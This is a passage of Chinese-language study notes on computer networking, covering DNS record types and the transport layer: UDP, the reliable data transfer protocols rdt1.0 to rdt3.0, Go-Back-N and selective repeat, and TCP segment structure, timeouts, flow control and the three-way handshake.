Type = A， 则 Name 是主机名， Value 是该主机名对应的 IP 地址。 因此， 一条类型为 A 的资源记录提供了标准的主机名到 IP 地址的映射。 例如 （ <a href="http://relayl.bar.foo.com">relayl.bar.foo.com</a>, 145.37.93.126， A ) 就是一条类型 A 记录。</li><li>如果 Type = NS, 则 Name 是个域（ 如 <a href="http://foo.com">foo.com</a>), 而 Value 是个知道如何获得该域中主机 IP 地址的权威 DNS 服务器的主机名。 这个记录用于沿着査询链来路由 DNS査询。 例如 （ <a href="http://fbo.com">fbo.com</a>, <a href="http://dns.foo.com">dns.foo.com</a>, NS) 就是一条类型为 NS 的记录。</li><li>如果 Type = CNAME， 则 Value 是别名为 Name 的主机对应的规范主机名。 该记录能够向査询的主机提供一个主机名对应的规范主机名， 例如（ <a href="http://foo.com">foo.com</a>, <a href="http://relay1.bar.foo.com">relay1.bar.foo.com</a>, CNAME) 就是一条 CNAME 类型的记录。</li><li>如果 Type = MX， 则 Value 是个别名为 Name 的邮件服务器的规范主机名。 举例来说， （ <a href="http://foo.com">foo.com</a>，<a href="http://mail.bar.foo.com">mail.bar.foo.com</a>, MX ) 就是一条 MX 记录。 MX 记录允许邮件服务器主机名具有简单的别名。 值得注意的是， 通过使用 MX 记录， 一个公司的邮件服务器和其他服务器（ 如它的 Web 服务器） 可以使用相同的别名。 为了获得邮件服务器的规范主机名， DNS 客户应当请求一条 MX 记录； 而为了获得其他服务器的规范主机名， DNS 客户应当请求 CNAME 记录。</li></ul><h1 id="第3章-运输层"><a class="markdownIt-Anchor" href="#第3章-运输层"></a> 第3章 运输层</h1><h2 id="31-概述和运输层服务"><a class="markdownIt-Anchor" href="#31-概述和运输层服务"></a> 3.1 概述和运输层服务</h2><p>运输层协议为运行在不同主机上的应用进程之间提供了<strong>逻辑通信 (logic conmmunication)</strong> 功能。</p><p>从应用程序的角度看， 通过逻辑通信， 运行不同进程的主机好像直接相连一样； 实际上， 这些主机也许位于地球的两侧， 通过很多路由器及多种不同类型的链路相连。</p><p>运输协议运行在<strong>端系统</strong>中</p><ul><li><p>发送方：在发送端， 运输层将从发送应用程序进程接收到的报文转换成运输层分组 ，传向网络层，网路层将其封装成网络层分组 （ 即数据报） 并向目的地发送。</p></li><li><p>接收方：在接收端， 网络层从数据报中提取运输层报文段， 并将该报文段向上交给运输层。 运输层则处理接收到的报文段， 使该报文段中的数据为接收应用进程使用。</p></li></ul><p>应用程序可供使用的运输协议不止一个</p><ul><li>因特网：TCP和UDP</li></ul><h3 id="311-运输层和网络层的关系"><a class="markdownIt-Anchor" href="#311-运输层和网络层的关系"></a> 3.1.1 运输层和网络层的关系</h3><p>网络层: 主机间的逻辑通信</p><p>运输层: 进程间的逻辑通信</p><h3 id="312-因特网运输层概述"><a class="markdownIt-Anchor" href="#312-因特网运输层概述"></a> 3.1.2 因特网运输层概述</h3><p>因特网网络层协议有一个名字叫 <strong>IP， 即网际协议</strong>。 IP为主机之间提供了逻辑通信。 IP 的服务模型是<strong>尽力而为交付服务</strong> （best- effort delivery service)。 这意味着 IP 尽它 “ 最大的努力” 在通信的主机之间交付报文段， 但它并不做任何确保。 特别是， 它不确保报文段的交付， 不保证报文段的按序交付， 不保证报文段中数据的完整性。 由于这些原因， IP 被称为<strong>不可靠服务</strong> （ unreliable service )</p><p>两种协议：</p><ul><li><p>一种是UDP ( 用户数据报协议），它为调用它的应用程序提供了一种不可靠、 无连接的服务。</p></li><li><p>另一种是 TCP ( 传输控制协议），它为调用它的应用程序提供了一种可靠的、 面向连接的服务。</p><ul><li><p>可靠数据传输</p><p>通过使用<strong>流量控制 、 序号 、 确认和定时器</strong>,TCP 确保正确地 、 按序地将数据从发送进程交付给接收进程。 这样， TCP 就将两个端系统间的不可靠 IP 服务转换成了一种进程间的<strong>可靠数据传输服务</strong></p></li><li><p>拥塞控制</p><p>TCP 拥塞控制防止任何一条TCP连接用过多流量来淹没通信主机之间的链路和交换设备。 TC力求为每个通过一条拥塞网络链路的连接平等地共享网络链路带宽。</p><p>通过调节 TCP 连接的发送端发送进网络的流量速率来做到</p></li></ul></li></ul><p>UDP 和 TCP 最基本的责任：</p><ul><li>将两个端系统间 IP 的交付服务扩展为运行在端系统上的两个进程之间的交付服务。 将主机间交付扩展到进程间交付被称为运输层的<strong>多路复用</strong>(transport-layer multiplexing) 与<strong>多路分解</strong>（demultiplexing)。</li></ul><h2 id="32-多路复用与多路分解"><a class="markdownIt-Anchor" href="#32-多路复用与多路分解"></a> 3.2 多路复用与多路分解</h2><p><strong>多路分解</strong> <strong>（ demultiplexing)。</strong></p><p>将运输层报文段中的数据交付到正确的套接字</p><p><strong>多路复用（ multiplexing)</strong></p><p>在源主机从不同套接字中收集数据块， 并为每个数据块封装上首部信息 （ 这将在以后用于分解） 从而生成报文段， 然后将报文段传递到网络层</p><p><img src="/posts/9d1d146e/image-20220405184918486.png" alt="image-20220405184918486"></p><p>运输层多路复用要求：</p><ul><li>①套接字有唯一标识符;</li><li>②每个报文段有特殊字段来指示该报文段所要交付到的套接字。</li></ul><p>这些特殊字段是源端口号字段 （source port number field ) 和目的端口号字段（destination port number field)。</p><p><strong>端口号</strong>是一个 16 比特的数， 其大小在 0 ~ 65535 之间。 0 ~1023 范围的端口号称为周知端口号（ well- known port<br>number), 是受限制的， 这是指它们保留给诸如 HTTP ( 它使用端口号 80) 和 FTP ( 它使用端口号 21) 之类的周知应用层协议来使用。</p><p><img src="/posts/9d1d146e/image-20220405185512467.png" alt="image-20220405185512467"></p><ol><li><p><strong>无连接的多路复用与多路分解</strong></p><p>UDP套接字由二元组全面标识 :</p><p>(目的地IP地址, 目的地端口号)</p><p>当主机接收UDP段时:</p><ul><li><p>在段中检查目的地端口号</p></li><li><p>将UDP段定向到具有该端口号的套接字</p></li></ul><p>具有不同源IP地址和/或源端口号的IP数据报（目的IP地址和端口号相同）定向到相同的套接字</p></li><li><p><strong>面向连接的多路复用与多路分解</strong></p><p>TCP套接字由四元组（<strong>4-tuple</strong>）标识:</p><ul><li><p>源IP地址</p></li><li><p>源端口号</p></li><li><p>目的IP地址</p></li><li><p>目的端口号</p></li></ul><p>接收主机使用这四个值来将段定向到适当的套接字</p></li><li><p><strong>Web服务器与TCP</strong></p><p>服务器主机可能支持许多并行的TCP套接字：</p><ul><li>每个套接字由其自己的四元组标识</li></ul><p>Web服务器对每个连接的客户机具有不同的套接字</p><ul><li>非持久HTTP将为每个请求具有不同的套接字</li></ul></li></ol><h2 id="33-无连接运输udp"><a class="markdownIt-Anchor" href="#33-无连接运输udp"></a> 3.3 无连接运输：UDP</h2><p>“尽力而为”服务，UDP段可能：</p><ul><li><p>丢包</p></li><li><p>对应用程序交付失序</p></li></ul><p>无连接</p><ul><li><p>在UDP发送方和接收方之间无握手</p></li><li><p>每个UDP段的处理独立于其他段</p></li></ul><blockquote><p><strong>为何要有 UDP协议?</strong>（优点）</p></blockquote><ul><li><p>无连接创建(它将增加时延)</p></li><li><p>简单：在发送方、接收方无连接状态</p></li><li><p>段首部小</p></li><li><p>无拥塞控制: UDP能够尽可能快地传输</p></li></ul><p>常用于流媒体应用程序</p><ul><li><p>丢包容忍</p></li><li><p>速率敏感</p></li></ul><p>其他UDP应用</p><ul><li><p>DNS</p></li><li><p>SNMP</p></li></ul><p>当应用程序<strong>对传输的可靠性要求不高</strong>，但是对<strong>传输速度和延迟要求较高</strong>时，可以用UDP协议来替代TCP协议在传输层控制数据的转发。</p><p>UDP适合于<strong>实时数据传输</strong>，如<strong>语音</strong>和<strong>视频通信</strong>，因为它们即使偶尔丢失一两个数据包，也不会对接收结果产生太大影响。例如：我们在看视频的时候偶尔丢一两个包也不影响体验。</p><h3 id="331-udp报文段结构必考"><a class="markdownIt-Anchor" href="#331-udp报文段结构必考"></a> 3.3.1 UDP报文段结构（必考）</h3><p><img src="/posts/9d1d146e/image-20220405192624662.png" alt="image-20220405192624662"></p><h3 id="332-udp检验和"><a class="markdownIt-Anchor" href="#332-udp检验和"></a> 3.3.2 UDP检验和</h3><p>UDP检验和提供了差错检测功能</p><p><img src="/posts/9d1d146e/image-20220405193257544.png" alt="image-20220405193257544"></p><p>步骤：求和，回卷，求反</p><h2 id="34-可靠数据传输原理"><a class="markdownIt-Anchor" href="#34-可靠数据传输原理"></a> 3.4 可靠数据传输原理</h2><p><strong>可靠数据传输协议（ reliable data transfer protocol)</strong> 为上层实体提供的服务抽象是： 数据可以通过一条可靠的信道进行传输。 借助于可靠信道， 传输数据比特就不会受到损坏(由 0 变为 1， 或者相反） 或丢失， 而且所有数据都是按照其发送顺序进行交付。 这恰好就是 TCP 向调用它的因特网应用所提供的服务模型</p><h3 id="341-构造可靠数据传输协议"><a class="markdownIt-Anchor" href="#341-构造可靠数据传输协议"></a> 3.4.1 构造可靠数据传输协议</h3><p><img src="/posts/9d1d146e/image-20220426161000253.png" alt="image-20220426161000253"></p><p>使用有限状态机 (FSM)来定义发送方和接收方</p><p><img src="/posts/9d1d146e/image-20220405205700680.png" alt="image-20220405205700680"></p><h4 id="rdt10"><a class="markdownIt-Anchor" href="#rdt10"></a> rdt1.0</h4><p>经完全可靠信道的可靠数据传输</p><ul><li><p>无比特差错</p></li><li><p>无分组丢失</p></li></ul><p><img src="/posts/9d1d146e/image-20220405205611048.png" alt="image-20220405205611048"></p><p>rdt 的发送端只通过 rdt_Send( data )事件接受来自较高层的数据， 产生一个包含该数据的分组（ 经由 make_pkt( data)动作） ， 并将分组发送到信道中。 实际上， rdtsemd(data)事件是由较高层应用的过程调用产生的（例如，rdt_send()).</p><p>在接收端， rdt 通过 rdt_rcv(packet)事件从底层信道接收一个分组， 从分组中取出数据(经由 extract( packet， data) 动作） ， 并将数据上传给较高层（通过deliver_data( data)动作.实际上， rdt_rcv( packet) 事件是由较低层协议的过程调用产生的（ 例如， rdt_rcv())</p><h4 id="rdt20"><a class="markdownIt-Anchor" href="#rdt20"></a> rdt2.0</h4><p>经具有比特差错信道的可靠数据传输</p><ul><li><p>有比特差错</p></li><li><p>无分组丢失</p></li></ul><p>数据出错后处理方式</p><ul><li>检错重传</li></ul><p>rdt2.0新增加机制（与rdt1.0比较）</p><p><strong>自动重传请求</strong>(Automatic Repeat reQuest, ARQ) 需要的另外三种协议功能来处理存在比特差错的情况：</p><ul><li><p>差错检错</p></li><li><p>反馈：ACK, NAK</p></li><li><p>重传</p></li></ul><p><img src="/posts/9d1d146e/image-20220405210230073.png" alt="image-20220405210230073"></p><p>存在一个致命的缺陷</p><ul><li>没有考虑到 ACK 或 NAK 分组受损的可能性！</li></ul><h4 id="rdt21"><a class="markdownIt-Anchor" href="#rdt21"></a> rdt2.1</h4><p>发送方:</p><ul><li><p>序号seq # 加入分组中</p></li><li><p>两个序号seq. #’s (0,1) 将够用. ( 为什么?  和前一状态区别即可)</p></li><li><p>必须检查是否收到的ACK/NAK受损</p></li><li><p>状态增加一倍</p></li><li><p>状态必须“记住”是否“当前的”分组具有0或1序号</p></li></ul><p>接收方:</p><ul><li><p>必须检查是否接收到的分组是冗余的</p><ul><li>状态指示是否0或1是所期待的分组序号seq #</li></ul></li><li><p>注意: 接收方不能知道是否它的最后的ACK/NAK在发送方已经接收OK</p></li></ul><p><img src="/posts/9d1d146e/image-20220405210352408.png" alt="image-20220405210352408"></p><p><img src="/posts/9d1d146e/image-20220405210401019.png" alt="image-20220405210401019"></p><h4 id="rdt22"><a class="markdownIt-Anchor" href="#rdt22"></a> rdt2.2</h4><p>一种无NAK的协议，仅使用ACK</p><p><img src="/posts/9d1d146e/image-20220405210551597.png" alt="image-20220405210551597"></p><p><img src="/posts/9d1d146e/image-20220405210602624.png" alt="image-20220405210602624"></p><h4 id="rdt30"><a class="markdownIt-Anchor" href="#rdt30"></a> rdt3.0</h4><p>经具有比特差错的丢包信道的可靠数据传输</p><ul><li><p>有比特差错</p></li><li><p>有分组丢失</p></li></ul><p>现有机制（检错、反馈、重传、序号）还不够</p><p>增加定时机制：发送方等待ACK一段“合理的”时间</p><ul><li><p>如在这段时间没有收到ACK则重传</p></li><li><p>如果分组(或ACK)只是延迟(没有丢失)，重传将是冗余的，但序号的使用已经处理了该情况</p></li></ul><p><img src="/posts/9d1d146e/image-20220405210728703.png" alt="image-20220405210728703"></p><p>接收方仅参考</p><p><img src="/posts/9d1d146e/image-20220405210917731.png" alt="image-20220405210917731"></p><p>分组序号在 0 和 1 之间交替， 因此 rdt3.0 有时被称为比特交替协议</p><p><img src="/posts/9d1d146e/image-20220405211003066.png" alt="image-20220405211003066"></p><h3 id="342-流水线可靠数据传输协议"><a class="markdownIt-Anchor" href="#342-流水线可靠数据传输协议"></a> 3.4.2 流水线可靠数据传输协议</h3><p>rdt3.0 性能问题的核心在于它是一个停等协议。</p><p><img src="/posts/9d1d146e/image-20220405211042449.png" alt="image-20220405211042449"></p><p>这种特殊的性能问题的一个简单解决方法是： 不以停等方式运行， 允许发送方发送多个分组而无须等待确认，即流水线技术</p><p>流水线技术对可靠数据传输协议可带来如下影响：</p><ul><li>必须增加序号范围， 因为每个输送中的分组（ 不计算重传的） 必须有一个唯一的序号， 而且也许有多个在输送中的未确认报文。</li><li>协议的发送方和接收方两端也许不得不缓存多个分组。 发送方最低限度应当能缓冲那些已发送但没有确认的分组。 如下面讨论的那样， 接收方或许也需要缓存那些已正确接收的分组。</li><li>所需序号范围和对缓冲的要求取决于数据传输协议如何处理丢失、 损坏及延时过大的分组。 解决流水线的差错恢复有两种基本方法是： 回退 N 步（ Go- Back- N，GBN ) 和选择重传（Selective Repeat，SR)</li></ul><p><img src="/posts/9d1d146e/image-20220405211102003.png" alt="image-20220405211102003"></p><p><strong>Go-Back-N</strong>和<strong>选择重传</strong>都是滑动窗口协议</p><p>发送方和接收方都具有一定容量的缓冲区（即窗口），允许发送站连续发送多个帧而不需要等待应答</p><p><strong>发送窗口</strong>就是发送端允许连续发送的帧的序号表，发送端可以不等待应答而连续发送的最大帧数称为发送窗口的尺寸</p><p><strong>接收窗口</strong>是接收方允许接收的帧的序号表，凡落在接收窗口内的帧，接收方都必须处理，落在接收窗口外的帧被丢弃。接收方每次允许接收的帧数称为接收窗口的尺寸</p><h3 id="343-回退n步"><a class="markdownIt-Anchor" href="#343-回退n步"></a> 3.4.3 回退N步</h3><p>窗口长度为N是因为流量控制和</p><p><img src="/posts/9d1d146e/image-20220405212221066.png" alt="image-20220405212221066"></p><p>简单来说：位于发送窗口内的分组才允许被发送，位于接收窗口内的分组才能被接收，关键是窗口如何滑动。</p><p><strong>特征：累计ACK，全部重传</strong></p><p>ACK(n): 确认所有的（包括序号n）的分组 - “累计ACK”</p><p>若超时，重传窗口中的未被确认的第一个分组n及所有更高序号的分组</p><p><img src="/posts/9d1d146e/image-20220405212405768.png" alt="image-20220405212405768"></p><p><img src="/posts/9d1d146e/image-20220405212413785.png" alt="image-20220405212413785"></p><p><img src="/posts/9d1d146e/image-20220405212429639.png" alt="image-20220405212429639"></p><p>理解累计ACK和回退N个重传</p><p>发送方</p><ul><li><p>发送窗口滑动的条件：收到1个确认分组</p></li><li><p>超时重传时，回退N个重传，通常重传多个分组</p></li></ul><p>接收方</p><ul><li>接收窗口滑动的条件：收到期望序号的分组</li><li>累计ACK s：s为期望收到的下一分组序号</li><li>对失序分组的处理：丢弃，重发（已按序接收分组的）ACK</li></ul><p>优点：实现简单，效率高于停等协议，对缓冲区要求不高</p><p>Go-Back-N不足：（效率明显高于停等协议）但仍有<strong>不必要重传</strong>的问题</p><h3 id="344-选择重传"><a class="markdownIt-Anchor" href="#344-选择重传"></a> 3.4.4 选择重传</h3><p>选择重传优点：没有不必要重传的问题</p><p>缺点：实现较复杂，对缓冲区有较大要求，同时必须等待超时才会重传，效率相对有所损失</p><p><img src="/posts/9d1d146e/image-20220405213248022.png" alt="image-20220405213248022"></p><p><img src="/posts/9d1d146e/image-20220405213311055.png" alt="image-20220405213311055"></p><p><img src="/posts/9d1d146e/image-20220405213324206.png" alt="image-20220405213324206"></p><table><thead><tr><th>机制</th><th>用途和说明</th></tr></thead><tbody><tr><td>检验和</td><td>用于检测在一个传输分组中的比特错误。</td></tr><tr><td>定时器</td><td>用于检测超时/重传一个分组，可能因为该分组（或其ACK）在信道中丢失了。由于当一个分组被时延但未丢失（过早超时），或当一个分组已被接收方收到但从接收方到发送方的ACK丢失时，可能产生超时事件，所以接收方可能会收到一个分组的多个冗余拷贝。</td></tr><tr><td>序号</td><td>用于为从发送方流向接收方的数据分组按顺序编号。所接收分组的序号间的空隙可使该接收方检测出丢失的分组。具有相同序号的分组可使接收方检测出一个分组的冗余拷贝。</td></tr><tr><td>确认</td><td>接收方用于告诉发送方一个分组或一组分组已被正确地接收到了。确认报文通常携带着被确认的分组或多个分组的序号。确认可以是逐个的或累积的，这取决于协议。</td></tr><tr><td>否定确认</td><td>接收方用于告诉发送方某个分组未被正确地接收。否定确认报文通常携带着未被正确接收的分组的序号。</td></tr><tr><td>窗口、流水线</td><td>发送方也许被限制仅发送那些序号落在一个指定范围内的分组。通过允许一次发送多个分组但未被确认，发送方的利用率可在停等操作模式的基础上得到增加。我们很快将会看到，窗口长度可根据接收方接收和缓存报文的能力或网络中的拥塞程度，或两者情况来进行设置。</td></tr></tbody></table><h2 id="35-面向连接的运输tcp"><a class="markdownIt-Anchor" href="#35-面向连接的运输tcp"></a> 3.5 面向连接的运输：TCP</h2><p>为了提供可靠数据传输， TCP 依赖于前一节所讨论的许多基本原理， 其中包括差错检测、 重传、 累积确认、 定时器以及用于序号和确认号的首部字段。</p><h3 id="351-tcp连接"><a class="markdownIt-Anchor" href="#351-tcp连接"></a> 3.5.1 TCP连接</h3><p><strong>端到端:</strong></p><ul><li><p>一个发送方, 一个接收方</p></li><li><p>连接状态与端系统有关，不为路由器所知</p></li></ul><p><strong>可靠、有序的字节流</strong></p><p><strong>流水线</strong>:</p><ul><li>TCP拥塞和流量控制设置滑动窗口协议</li></ul><p><strong>发送和接收缓冲区</strong></p><p><strong>全双工数据:</strong></p><ul><li><p>同一连接上的双向数据流</p></li><li><p>MSS: 最大报文段长度（设置该 MSS 要保证一个 TCP报文段（ 当封装在一个 1P 数据报中） 加上 TCP/IP 首部长度 （ 通常 40 字节） 将适合单个链路层帧）</p></li><li><p>MTU: 最大传输单元（链路层）</p></li></ul><p><strong>面向连接:</strong></p><ul><li>在进行数据交换前，初始化发送方与接收方状态，进行握手(交换控制信息),</li></ul><p><strong>流量控制:</strong></p><ul><li>发送方不能淹没接收方</li></ul><p><strong>拥塞控制</strong>:</p><ul><li>抑止发送方速率来防止过分占用网络资源</li></ul><h3 id="352-tcp报文段结构必考"><a class="markdownIt-Anchor" href="#352-tcp报文段结构必考"></a> 3.5.2 TCP报文段结构(必考)</h3><p>TCP 报文段由<strong>首部字段</strong>和一个<strong>数据字段</strong>组成。 数据字段包含一块应用数据。 如前所述， MSS 限制了报文段数据字段的最大长度。</p><p><img src="/posts/9d1d146e/image-20220407104835276.png" alt="image-20220407104835276"></p><p>首部包括：</p><ul><li><strong>源端口号和目的端口号</strong>， 它被用于多路复用/分解来自或送到上层应用的数据。</li><li><strong>32比特的序号字段</strong> （ sequence number field ) 和 <strong>32 比特的确认号字段</strong> （ acknowledgment number field )。 这些字段被 TCP 发送方和接收方用来实现可靠数据传输服务， 讨论见后。</li><li><strong>16比特的接收窗口字段</strong>（ receive window field )， 该字段用于流量控制。 我们很快就会看到， 该字段用于指示接收方愿意接受的字节数量。</li><li><strong>4比特的首部长度字段</strong> ( header length field ), 该字段指示了以 32 比特的字为单位的 TCP 首部长度。 由于 TCP 选项字段的原因， TCP 首部的长度是可变的。 （ 通常，选项字段为空， 所以 TCP 首部的典型长度是 20 字节。）</li><li><strong>可选与变长的选项字段</strong>（ options field ) , 该字段用于发送方与接收方协商最大报文段长度（ MSS) 时， 或在高速网络环境下用作窗口调节因子时使用。 首部字段中还定义了一个时间戳选项。 可参见 RFC 854 和 RFC 1323 了解其他细节。</li><li><strong>6 比特的标志字段</strong>（ flag field )。<ul><li>ACK比特用于指示确认字段中的值是有效的， 即该报文段包括一个对已被成功接收报文段的确认。</li><li>RST、SYN 和 FIN 比特用于连接建立和拆除。</li><li>在明确拥塞通告中使用了 CWR 和ECE 比特， 如 3. 7. 2 节中讨论的那样。</li><li>当 PSH 比特被置位时， 就指示接收方应立即将数据交给上层。</li><li>URG 比特用来指示报文段里存在着被发送端的上层实体置为 “ 紧急” 的数据。 紧急数据的最后一个字节由 16 比特的紧急数据指针字段( urgent data pointer field ) 指出。 当紧急数据存在并给出指向紧急数据尾指针的时候， TCP 必须通知接收端的上层实体（在实践中， PSH、 URG 和紧急数据指针并没有使用）</li></ul></li></ul><p><strong>序号和确认号</strong></p><p><strong>序号:</strong></p><ul><li>报文段中第1个数据字节在字节流中的位置编号</li></ul><p><strong>确认号</strong>:</p><ul><li><p>期望从对方收到下一个字节的序号</p></li><li><p>累计应答</p></li></ul><p>例子：</p><p><img src="/posts/9d1d146e/image-20220407111203087.png" alt="image-20220407111203087"></p><h3 id="353-往返时间的估计与超时"><a class="markdownIt-Anchor" href="#353-往返时间的估计与超时"></a> 3.5.3 往返时间的估计与超时</h3><p>问题: 如何设置TCP 超时值?</p><p>应大于RTT</p><ul><li>但RTT是变化的</li></ul><p>太短: 过早超时</p><ul><li>不必要的重传</li></ul><p>太长: 对报文段的丢失响应太慢，导致数据传输时延大</p><p>1.<strong>估计往返时间</strong></p><p><strong>SampleRTT</strong>: 从发送报文段到接收到ACK的测量时间</p><ul><li>大多数 TCP的实现仅在某个时刻做一次 SampleRTT 测量， 而不是为每个发送的报文段测量一个 SampleRTT。 这就是说， 在任意时刻， 仅为一个已发送的但目前尚未被确认的报文段估计 SampleRTT， 从而产生一个接近每个 RTT 的新 SampleRTT 值。</li></ul><p><strong>EstimatedRTT</strong>：TCP 维持的一个 SampleRTT 均值。一旦获得一个新SampleRTT 时，TCP 就会根据下列公式来更新EstimatedRTT</p><p><img src="/posts/9d1d146e/image-20220407130626339.png" alt="image-20220407130626339"></p><p>α推荐值为0.125</p><p><strong>DevRTT</strong>：RTT 偏差，用于估算 SampleRTT 一般会偏离 EstimatedRTT 的程度：</p><p><img src="/posts/9d1d146e/image-20220407130742411.png" alt="image-20220407130742411"></p><p>β的推荐值为 0.25</p><p><strong>2.设置和管理重传超时间隔</strong></p><p>超时间隔设为 EstimatedRTT 加上一定余量。 当SampleRTT 值波动较大时， 这个余量应该大些； 当波动较小时， 这个余量应该小些</p><p><img src="/posts/9d1d146e/image-20220407131057903.png" alt="image-20220407131057903"></p><h3 id="354-可靠数据传输"><a class="markdownIt-Anchor" href="#354-可靠数据传输"></a> 3.5.4 可靠数据传输</h3><p>TCP在IP 不可靠的尽力而为服务之上创建了一种<strong>可靠数据传输服务</strong>（ reliable data transfer service).TCP 的可靠数据传输服务确保一个进程从其接收缓存中读出的数据流是无损坏、 无间隙 、 非冗余和按序的数据流；</p><p>TCP 发送方有3个与发送和重传有关的主要事件：</p><ul><li><p>从上层应用程序接收数据</p><p>一旦第一个主要事件发生， TCP 从应用程序接收数据， 将数据封装在一个报文段中， 并把该报文段交给 IP。 注意到每一个报文段都包含一个序号， 如 3.5.2 节所讲的那样， 这个序号就是该报文段第一个数据字节的字节流编号。 还要注意到如果定时器还没有为某些其他报文段而运行， 则当报文段被传给 IP 时， TCP 就启动该定时器。</p></li><li><p>定时器超时</p><p>TCP 通过重传引起超时的报文段来响应超时事件。 然后 TCP重启定时器</p></li><li><p>收到 ACK</p><p>到达一个来自接收方的确认报文段（ ACK)( 更确切地说， 是一个包含了有效 ACK 字段值的报文段）。 当该事件发生时， TCP 将 ACK 的值:K 与它的变量 SendBase 进行比较。 TCP 状态变量 SendBase 是最早未被确认的字节的序号。<br>(因此 SendBase-1 是指接收方已正确按序接收到的数据的最后一个字节的序号如前面指出的那样， TCP 采用累积确认， 所以y 确认了字节编号在y之前的所有字节都已经收到。 如果 y&gt;SendBase, 则该 ACK 是在确认一个或多个先前未被确认的报文段。 因此发送方更新它的 SendBase 变量； 如果当前有未被确认的报文段， TCP 还要重新启动定时器。</p></li></ul><p><img src="/posts/9d1d146e/image-20220407131912762.png" alt="image-20220407131912762"></p><p><strong>2.超时间隔加倍</strong></p><p>每次 TCP 重传时都会将下一次的超时间隔设时间&amp;为先前值的两倍， 而不是用从 EstimaledRTT和 DevRTT 推算岀的值（ 如在 3.5.3 节中所描述的）。</p><p>然而， 每当定时器在另两个事件（ 即收到上层应用的数据和收到 ACK) 中的任意一个启动时， Timeoutlnterval 由最近的 EstimatedRTT 值与 DevRTT 值推算得到。</p><p><strong>3.快速重传</strong></p><p>超时间隔常常相对较长:</p><ul><li>重传丢失报文段以前有长时延</li></ul><p>通过冗余ACK，检测丢失的报文段</p><ul><li><p>发送方经常一个接一个的发送报文段</p></li><li><p>如果报文段丢失，将会收到很多重复ACK</p></li><li><p>如果对相同数据，发送方收到3个ACK, 假定被确认的报文段以后的报文段丢失了:</p></li></ul><p><strong>快速重传</strong>: 在定时器超时之前重传</p><p><img src="/posts/9d1d146e/image-20220407133650972.png" alt="image-20220407133650972"></p><p><img src="/posts/9d1d146e/image-20220407133823612.png" alt="image-20220407133823612"></p><p><strong>TCP 的差错恢复机制也许最好被分类为GBN协议与SR协议的混合体</strong></p><p>既不会回退N步，而是至多重传一个报文段</p><p>也不会等待超时间隔到达才重传，而是快速重传，收到失序报文段时，接收方会不断发送冗余ACK，达到一定数量发送方就会重传该报文段</p><h3 id="355-流量控制"><a class="markdownIt-Anchor" href="#355-流量控制"></a> 3.5.5 流量控制</h3><p>TCP 为它的应用程序提供了流量控制服务（ flow- control service ) 以<strong>消除发送方使接收方缓存溢出的可能性</strong>。 流量控制因此是一个速度匹配服务， 即发送方的发送速率与接收方应用程序的读取速率相匹配。</p><blockquote><p>和拥塞控制的区别：</p><p>TCP 发送方也可能因为 <strong>IP 网络的拥塞而被遏制</strong>；</p><p>这种形式的发送方的控制被称为拥塞控制 （ congestion control )，</p></blockquote><p>TCP 通过让发送方维护一个称为接收窗口（ receive window ) 的变量来提供流量控制。通俗地说， 接收窗口用于给发送方一个指示—该接收方还有多少可用的缓存空间。</p><p><img src="/posts/9d1d146e/image-20220407134154976.png" alt="image-20220407134154976"></p><p><img src="/posts/9d1d146e/image-20220407134210923.png" alt="image-20220407134210923"></p><p>主机 A 在该连接的整个生命周期须保证：<br>LastByteSent - LastByteAcked ≤ rwnd</p><h3 id="356-tcp连接管理"><a class="markdownIt-Anchor" href="#356-tcp连接管理"></a> 3.5.6 TCP连接管理</h3><p><a href="https://www.eet-china.com/mp/a44399.html">关于三次握手和四次回收一个很好的解释</a></p><p>TCP是面向连接的协议，TCP连接的建立和释放是每次TCP传输中必不可少的过程。</p><p>TCP的传输连接包括三个状态</p><ul><li><p>连接建立</p></li><li><p>数据传输</p></li><li><p>连接释放</p></li></ul><p><img src="/posts/9d1d146e/image-20220407134812668.png" alt="image-20220407134812668"></p><p><strong>建立连接(三次握手）：</strong></p><ul><li>第一步： 客户端的 TCP 首先向服务器端的 TCP 发送一个特殊的 TCP 报文段。 该报文段中不包含应用层数据。 但是在报文段的首部（ 参见图 3-29 ) 中的一个标志位( 即 SYN 比特） 被置为 1。 因此， 这个特殊报文段被称为 SYN 报文段。 另外， 客户会随机地选择一个初始序号（ client isn), 并将此编号放置于该起始的 TCP SYN报文段的序号字段中。 该报文段会被封装在一个 IP 数据报中， 并发送给服务器。为了避免某些安全性攻击， 在适当地随机化选择 client.isn 方面有着不少有趣的研究 [ CERT 2001-09]。</li><li>第二步： 一旦包含 TCP SYN 报文段的 IP 数据报到达服务器主机（ 假定它的确到达了！ ） ， 服务器会从该数据报中提取出 TCP SYN 报文段， 为该 TCP 连接分配 TCP 缓存和变量， 并向该客户 TCP 发送允许连接的报文段。 （ 我们将在第 8 章看到， 在完成三次握手的第三步之前分配这些缓存和变量， 使得 TCP 易于受到称为 SYN 洪泛的拒绝服务攻击。） 这个允许连接的报文段也不包含应用层数据。 但是， 在报文段的首部却包含 3 个重要的信息。 首先， SYN 比特被置为 1。 其次， 该 TCP 报文段首部的确认号字段被置为 Client_isn + 1。 最后， 服务器选择自己的初始序号(server_isn ) , 并将其放置到 TCP 报文段首部的序号字段中。 这个允许连接的报文段实际上表明了： “ 我收到了你发起建立连接的 SYN 分组， 该分组带有初始序号client_isn。 我同意建立该连接。 我自己的初始序号是 server_isn。 ” 该允许连接的报文段被称为 SYNACK 报文段（ SYNACK segment ).</li><li>第三步： 在收到 SYN ACK 报文段后， 客户也要给该连接分配缓存和变量。 客户主机则向服务器发送另外一个报文段； 这最后一个报文段对服务器的允许连接的报文段进行了确认（ 该客户通过将值 server.isn + 1 放置到 TCP 报文段首部的确认字段中来完成此项工作）。 因为连接已经建立了， 所以该 SYN 比特被置为 0。 该三次握手的第三个阶段可以在报文段负载中携带客户到服务器的数据。</li></ul><blockquote><h2 id="tcp协议请求建立连接时为什么要有三次握手第三次握手的作用是什么"><a class="markdownIt-Anchor" href="#tcp协议请求建立连接时为什么要有三次握手第三次握手的作用是什么"></a> TCP协议请求建立连接时，为什么要有三次握手，第三次握手的作用是什么？</h2><p>三次握手的主要作用就是为了确认双方的接收和发送能力是否正常，初始序列号，交换窗口大小以及 MSS 等信息。</p><p><img src="/posts/9d1d146e/image-20220413204733374.png" alt="image-20220413204733374"></p><ul><li>第一次握手：客户端发送 <code>SYN</code> 报文，并进入 <code>SYN_SENT</code> 状态，等待服务器的确认；</li><li>第二次握手：服务器收到 <code>SYN</code> 报文，需要给客户端发送 <code>ACK</code> 确认报文，同时服务器也要向客户端发送一个 <code>SYN</code> 报文，所以也就是向客户端发送 <code>SYN + ACK</code> 报文，此时服务器进入 <code>SYN_RCVD</code> 